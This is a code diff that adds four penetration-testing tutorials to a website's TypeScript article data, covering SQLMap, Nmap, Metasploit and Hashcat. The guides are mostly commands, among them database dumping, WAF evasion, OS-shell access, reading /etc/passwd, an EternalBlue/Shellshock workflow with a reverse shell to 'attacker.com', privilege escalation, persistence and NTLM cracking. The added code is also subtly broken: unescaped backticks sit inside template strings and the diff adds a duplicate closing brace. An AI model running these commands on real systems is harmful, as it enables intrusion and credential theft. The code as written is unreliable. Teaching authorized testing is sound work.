@@ -478,6 +478,434 @@ bettercap -iface wlan0
 Regular wireless security assessments are essential for any organization. Combine automated scanning with manual testing for comprehensive coverage.
     `,
   },
+
+  "sqlmap-injection-guide": {
+    slug: "sqlmap-injection-guide",
+    title: "SQLMap: Automated SQL Injection Testing Guide",
+    category: "Tools",
+    readTime: 15,
+    date: "2026-03-10",
+    author: "Semih Kilic",
+    excerpt: "Complete guide to using SQLMap for automated SQL injection detection and exploitation — from basic enumeration to advanced database takeover techniques.",
+    tags: ["sqlmap", "sql-injection", "web-security", "penetration-testing"],
+    content: `
+## Introduction
+
+SQLMap is the most popular open-source SQL injection and database takeover tool. It automates the process of detecting and exploiting SQL injection vulnerabilities. This guide covers everything from basic usage to advanced techniques.
+
+## Basic Scanning
+
+Start with a simple URL test:
+
+\`\`\`bash
+# Basic SQL injection test
+sqlmap -u "https://target.com/page?id=1"
+
+# Test with POST data
+sqlmap -u "https://target.com/login" --data="user=admin&pass=123"
+
+# Test specific parameter
+sqlmap -u "https://target.com/page?id=1" -p id
+\`\`\`
+
+## Database Enumeration
+
+Once a vulnerability is found, enumerate the database:
+
+\`\`\`bash
+# List databases
+sqlmap -u "https://target.com/page?id=1" --dbs
+
+# List tables in a database
+sqlmap -u "https://target.com/page?id=1" -D mydb --tables
+
+# Dump table contents
+sqlmap -u "https://target.com/page?id=1" -D mydb -T users --dump
+
+# Dump all databases
+sqlmap -u "https://target.com/page?id=1" --dump-all
+\`\`\`
+
+## Advanced Techniques
+
+### Bypass WAF/IPS
+\`\`\`bash
+# Use tamper scripts to bypass WAF
+sqlmap -u "https://target.com/page?id=1" --tamper=space2comment,between
+
+# Randomize user-agent
+sqlmap -u "https://target.com/page?id=1" --random-agent
+
+# Use cookies for authentication
+sqlmap -u "https://target.com/page?id=1" --cookie="session=abc123"
+\`\`\`
+
+### OS Shell Access
+\`\`\`bash
+# Get an interactive OS shell
+sqlmap -u "https://target.com/page?id=1" --os-shell
+
+# Read local files
+sqlmap -u "https://target.com/page?id=1" --file-read="/etc/passwd"
+\`\`\`
+
+## Best Practices
+
+1. **Always get authorization** before testing
+2. **Start with less intrusive tests** (`--level=1 --risk=1`)
+3. **Use `--batch`** for automated scanning
+4. **Save your session** with `--session` for resume capability
+5. **Test in a lab first** to understand the tool
+
+## Conclusion
+
+SQLMap is an essential tool for web application security testing. Master its enumeration capabilities and always use it responsibly with proper authorization.
+    `,
+  },
+  "nmap-network-scanning": {
+    slug: "nmap-network-scanning",
+    title: "Nmap: Complete Network Scanning & Discovery Guide",
+    category: "Tools",
+    readTime: 14,
+    date: "2026-02-28",
+    author: "Semih Kilic",
+    excerpt: "Master Nmap for network discovery, port scanning, service detection, and OS fingerprinting — the Swiss Army knife of network security.",
+    tags: ["nmap", "network-scanning", "port-scanning", "reconnaissance"],
+    content: `
+## Introduction
+
+Nmap (Network Mapper) is the industry standard for network discovery and security auditing. Every security professional must master Nmap. This guide covers practical scanning techniques.
+
+## Basic Scanning Types
+
+\`\`\`bash
+# Quick scan of common ports
+nmap target.com
+
+# Scan all 65535 ports
+nmap -p- target.com
+
+# Scan specific ports
+nmap -p 22,80,443 target.com
+
+# Scan a range
+nmap -p 1-1000 target.com
+\`\`\`
+
+## Service Detection
+
+\`\`\`bash
+# Detect service versions
+nmap -sV target.com
+
+# Aggressive detection (OS + version + scripts)
+nmap -A target.com
+
+# Detect HTTP servers
+nmap --script http-server-header target.com
+\`\`\`
+
+## Scan Techniques
+
+\`\`\`bash
+# SYN scan (stealth, default)
+nmap -sS target.com
+
+# TCP connect scan (no root required)
+nmap -sT target.com
+
+# UDP scan
+nmap -sU target.com
+
+# Null scan (bypass some firewalls)
+nmap -sN target.com
+
+# Xmas scan
+nmap -sX target.com
+\`\`\`
+
+## NSE Scripts
+
+Nmap Scripting Engine (NSE) extends functionality:
+
+\`\`\`bash
+# Run default scripts
+nmap -sC target.com
+
+# Run specific script category
+nmap --script vuln target.com
+
+# HTTP enumeration
+nmap --script http-enum target.com
+
+# SSL vulnerability scan
+nmap --script ssl-enum-ciphers target.com
+
+# SMB enumeration
+nmap --script smb-enum-shares target.com
+\`\`\`
+
+## Output Formats
+
+\`\`\`bash
+# Normal output
+nmap -oN scan.txt target.com
+
+# XML output (for tools like Metasploit)
+nmap -oX scan.xml target.com
+
+# Grepable output
+nmap -oG scan.grep target.com
+\`\`\`
+
+## Practical Examples
+
+\`\`\`bash
+# Full network audit
+nmap -sS -sV -sC -O -p- -oN full_audit.txt 192.168.1.0/24
+
+# Quick web server discovery
+nmap -p 80,443,8080,8443 --open -oG webservers.txt 10.0.0.0/24
+
+# Find vulnerable services
+nmap --script vuln --script-args intensity=0 -p- target.com
+\`\`\`
+
+## Conclusion
+
+Nmap is the foundation of network security testing. Practice in your own lab and always obtain proper authorization before scanning networks you don't own.
+    `,
+  },
+  "metasploit-exploitation": {
+    slug: "metasploit-exploitation",
+    title: "Metasploit Framework: From Zero to Exploit",
+    category: "Tools",
+    readTime: 18,
+    date: "2026-02-15",
+    author: "Semih Kilic",
+    excerpt: "Complete walkthrough of Metasploit Framework — module types, exploit development, payload handling, and post-exploitation techniques.",
+    tags: ["metasploit", "exploitation", "penetration-testing", "msfconsole"],
+    content: `
+## Introduction
+
+Metasploit Framework is the world's most used penetration testing framework. It provides tools for every stage of a penetration test — from information gathering to post-exploitation.
+
+## Getting Started
+
+\`\`\`bash
+# Start Metasploit console
+msfconsole
+
+# Search for exploits
+search type:exploit platform:windows smb
+
+# Use an exploit
+use exploit/windows/smb/ms17_010_eternalblue
+
+# Show options
+show options
+
+# Set options
+set RHOSTS 192.168.1.100
+set LHOST 192.168.1.10
+\`\`\`
+
+## Module Types
+
+### Exploits
+\`\`\`
+exploit/multi/handler          # Generic listener
+exploit/windows/smb/           # Windows SMB exploits
+exploit/linux/http/            # Linux web exploits
+exploit/multi/http/            # Cross-platform web
+\`\`\`
+
+### Payloads
+\`\`\`
+payload/windows/meterpreter/reverse_tcp    # Windows reverse shell
+payload/linux/x64/meterpreter/reverse_tcp  # Linux reverse shell
+payload/python/meterpreter/reverse_tcp     # Python cross-platform
+\`\`\`
+
+### Auxiliary Modules
+\`\`\`
+auxiliary/scanner/             # Scanning modules
+auxiliary/admin/               # Administration tools
+auxiliary/gather/              # Information gathering
+\`\`\`
+
+## Exploitation Workflow
+
+\`\`\`bash
+# 1. Find a target
+search type:exploit apache
+
+# 2. Select and configure
+use exploit/linux/http/apache_mod_cgi_bash_env_exec
+set RHOSTS target.com
+set TARGETURI /cgi-bin/test.cgi
+
+# 3. Set payload
+set PAYLOAD linux/x64/meterpreter/reverse_tcp
+set LHOST attacker.com
+set LPORT 4444
+
+# 4. Exploit
+exploit
+\`\`\`
+
+## Post-Exploitation
+
+Once you have a Meterpreter session:
+
+\`\`\`bash
+# System information
+sysinfo
+getuid
+
+# File operations
+download /etc/passwd
+upload shell.sh
+
+# Network reconnaissance
+ifconfig
+route
+netstat
+
+# Privilege escalation
+getsystem
+
+# Persistence
+run persistence -U -i 10 -p 4444
+\`\`\`
+
+## Best Practices
+
+1. **Only use against authorized targets**
+2. **Always set up a listener** before exploiting
+3. **Use `check`** to verify vulnerability before exploiting
+4. **Document everything** for your report
+5. **Clean up** after testing
+
+## Conclusion
+
+Metasploit is powerful but must be used responsibly. Master the basics in a lab environment before testing on real systems.
+    `,
+  },
+  "hashcat-password-cracking": {
+    slug: "hashcat-password-cracking",
+    title: "Hashcat: GPU-Accelerated Password Cracking Mastery",
+    category: "Tools",
+    readTime: 16,
+    date: "2026-01-28",
+    author: "Semih Kilic",
+    excerpt: "Advanced Hashcat techniques for password auditing — hash modes, rule-based attacks, mask attacks, and optimization strategies.",
+    tags: ["hashcat", "password-cracking", "hash-cracking", "security-audit"],
+    content: `
+## Introduction
+
+Hashcat is the world's fastest password recovery utility. It supports GPU acceleration and over 300 hash types. This guide covers advanced techniques for security professionals.
+
+## Hash Modes
+
+\`\`\`bash
+# List all hash modes
+hashcat --help | grep "MODE"
+
+# Common hash modes:
+# 0    = MD5
+# 1000 = NTLM
+# 1400 = SHA-256
+# 1800 = sha512crypt
+# 3200 = bcrypt
+\`\`\`
+
+## Attack Modes
+
+### Dictionary Attack
+\`\`\`bash
+# Basic dictionary attack
+hashcat -m 0 -a 0 hashes.txt wordlist.txt
+
+# With rules
+hashcat -m 0 -a 0 hashes.txt wordlist.txt -r rules/best64.rule
+\`\`\`
+
+### Mask Attack
+\`\`\`bash
+# 8-character password with unknown chars
+# ?l = lowercase, ?u = uppercase, ?d = digit, ?s = special
+hashcat -m 0 -a 3 hashes.txt ?l?l?l?l?l?l?l?l
+
+# Password starting with capital
+hashcat -m 0 -a 3 hashes.txt ?u?l?l?l?l?l?l?d
+\`\`\`
+
+### Rule-Based Attack
+\`\`\`bash
+# Apply multiple rule files
+hashcat -m 0 -a 0 hashes.txt wordlist.txt -r rules/toggles1.rule -r rules/best64.rule
+
+# Custom rule example
+# : lowercase, c capitalize, t toggle case
+hashcat -m 0 -a 0 hashes.txt wordlist.txt -r custom.rule
+\`\`\`
+
+### Hybrid Attack
+\`\`\`bash
+# Word + mask (word + 4 digits)
+hashcat -m 0 -a 6 hashes.txt wordlist.txt ?d?d?d?d
+
+# Mask + word (4 digits + word)
+hashcat -m 0 -a 7 hashes.txt ?d?d?d?d wordlist.txt
+\`\`\`
+
+## Optimization
+
+\`\`\`bash
+# Force specific GPU type
+hashcat -m 0 -a 0 hashes.txt wordlist.txt -d 1
+
+# Optimize for speed
+hashcat -m 0 -a 0 hashes.txt wordlist.txt -O
+
+# Session management
+hashcat -m 0 -a 0 hashes.txt wordlist.txt --session=mysession
+hashcat --session=mysession --restore
+\`\`\`
+
+## Practical Workflow
+
+\`\`\`bash
+# 1. Identify hash type
+hashid -f hashes.txt
+hash-identifier < hash.txt
+
+# 2. Choose attack strategy
+# Start with dictionary + rules
+# Then mask for remaining
+# Finally hybrid for complex passwords
+
+# 3. Monitor progress
+# Press 's' for status during cracking
+# Press 'p' to pause, 'r' to resume
+\`\`\`
+
+## Best Practices
+
+1. **Only crack hashes you have authorization for**
+2. **Use rule-based attacks first** (most efficient)
+3. **Combine multiple wordlists** for better coverage
+4. **Monitor GPU temperature** to prevent hardware damage
+5. **Save sessions** for long-running attacks
+
+## Conclusion
+
+Hashcat is essential for password security auditing. Use it to verify password policies and identify weak credentials in your organization.
+    `,
+  },
+};
+
 };
 
 function formatDate(dateStr: string, locale: string) {
